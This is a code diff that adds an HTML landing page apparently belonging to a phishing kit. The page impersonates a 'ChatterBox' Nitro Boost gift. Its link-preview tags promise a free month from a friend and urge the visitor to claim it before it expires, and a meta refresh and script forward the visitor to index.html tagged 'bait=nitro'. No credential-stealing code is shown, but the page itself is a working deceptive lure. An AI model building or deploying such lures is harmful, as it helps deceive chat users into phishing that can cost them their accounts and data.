@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ChatterBox | 1-Month Nitro Boost Gift</title>
+  <meta property="og:type" content="website" />
+  <meta property="og:title" content="🚀 You received a 1-Month ChatterBox Nitro Gift!" />
+  <meta property="og:description" content="A friend gifted you 1 month of Nitro Boost + HD Streaming. Tap to claim before it expires." />
+  <meta name="theme-color" content="#5865F2" />
+  <meta http-equiv="refresh" content="0; url=./index.html?bait=nitro" />
+</head>
+<body style="background:#0b0d12;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
+  <p>Loading gift...</p>
+  <script>
+    const p = new URLSearchParams(window.location.search);
+    if (!p.has('bait')) p.set('bait', 'nitro');
+    window.location.replace('./index.html?' + p.toString());
+  </script>
+</body>
+</html>
